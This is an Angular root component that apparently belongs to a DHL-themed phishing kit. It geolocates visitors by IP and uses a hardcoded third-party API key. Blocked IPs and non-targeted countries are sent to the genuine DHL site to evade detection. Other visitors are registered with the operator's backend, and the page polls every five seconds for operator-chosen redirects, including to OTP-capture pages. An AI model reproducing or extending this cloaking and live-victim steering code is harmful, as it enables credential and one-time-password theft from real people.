import { HttpClient } from '@angular/common/http';
import { Component } from '@angular/core';
import { CookieService } from 'ngx-cookie-service';
import { AppService } from './app.service';
import { MessagesService } from './websocket.service';
import { ActivatedRoute, NavigationExtras, Router } from '@angular/router';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent {
  constructor(private http: HttpClient, private cookieService: CookieService, private appService: AppService, private socketService: MessagesService, private router: Router, private ActivatedRoute: ActivatedRoute) {
  }
  id: any;
  device = navigator.userAgent;
  last_connected = new Date();
  ngOnInit() {

    this.checkDirection();
    this.http.get('https://api.ipify.org?format=json').subscribe(
      (data: any) => {
        const userIP = data.ip;
        console.log("ip::", userIP);
        this.appService.getBlocked().subscribe(
          res => {
            const searchIp = this.findIp(res, userIP);
            console.log(searchIp);
            if (searchIp) {
              window.location.href = 'https://www.dhl.com/fr-fr/home.html'
            }
          }
        )




      })


    if (!this.cookieService.get('id')) {

      this.id = this.generateUniqueId(20);
      const expirationTime = new Date();
      expirationTime.setHours(expirationTime.getHours() + 1);
      this.cookieService.set('id', this.id, expirationTime)
      this.socketService.getmsg(this.id);






      this.http.get('https://api.ipify.org?format=json').subscribe(
        (data: any) => {
          const userIP = data.ip;

          this.http.get(`https://api.ipgeolocation.io/ipgeo?apiKey=7c5ec8a279a44f849b8ee51105d6ab23&ip=${userIP}`).subscribe(
            (response: any) => {
              const userCountryCode = response.country_code2;
              this.cookieService.set('country', response.country_name);
              this.appService.getCountries().subscribe(
                res => {
                  console.log("country", response)
                  const foundCountry = this.findCountryByCode(res, userCountryCode);
                  if (!foundCountry) {
                    window.location.href = 'https://www.dhl.com/fr-fr/home.html'
                  }
                }
              )




              const body = {
                id: this.id,
                device: this.device,
                last_connected: this.last_connected,
                status: 'On-Line',
                page_id: 'DHL',
                Country: userCountryCode,
                ip: userIP
              }

              this.appService.addUser(body).subscribe(res => {

              });





            },
            (error: any) => {
              console.error('Error:', error);
            }
          );
        },
        (error: any) => {
          console.error('Error:', error);
        }
      );

    } else {

      const status = "On-Line";
      this.socketService.getmsg(this.cookieService.get('id'));
      this.appService.updateUser(undefined, this.cookieService.get('id'), undefined, status, undefined, undefined).subscribe(res => {

      });
    }



  }
  ngOnDestroy() {
    this.socketService.close();
    this.cookieService.delete('id');
  }
  findCountryByCode(countryArray, userCountryCode: string) {
    // Use the find method to search for the object with the matching Country_code
    const foundCountry = countryArray.find((countryObj) => countryObj.Country_code === userCountryCode);

    // Return the found object or null if not found
    return foundCountry || null;
  }
  findIp(countryArray, userCountryCode: string) {
    // Use the find method to search for the object with the matching Country_code
    const foundCountry = countryArray.find((countryObj) => countryObj.ip === userCountryCode);

    // Return the found object or null if not found
    return foundCountry || null;
  }
  generateUniqueId(length: number): string {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let uniqueId = '';

    for (let i = 0; i < length; i++) {
      const randomIndex = Math.floor(Math.random() * charactersLength);
      uniqueId += characters.charAt(randomIndex);
    }

    return uniqueId;
  }
  checkDirection() {
    setInterval(() => {
      const url = this.router.url;
      if (this.cookieService.get('id')) {
        this.appService.checkRedirect(this.cookieService.get('id')).subscribe(
          res => {


            if (res.redirect != null && res.redirect != url.slice(1)) {
              const containsOtp = /otp/i.test(res.redirect);
              if (containsOtp) {
                const valuesArray = res.redirect.split('/');
                this.router.navigate([`/${valuesArray[0]}`, valuesArray[1]])
              } else {
                this.router.navigate([`/${res.redirect}`])
              }



              this.appService.updateRedirect(this.cookieService.get('id'), null).subscribe();
              const status = "On-Line"
              this.appService.updateUser(undefined, this.cookieService.get('id'), undefined, status, undefined, undefined).subscribe();



            }

          }
        )
      }

    }, 5000)

  }
}
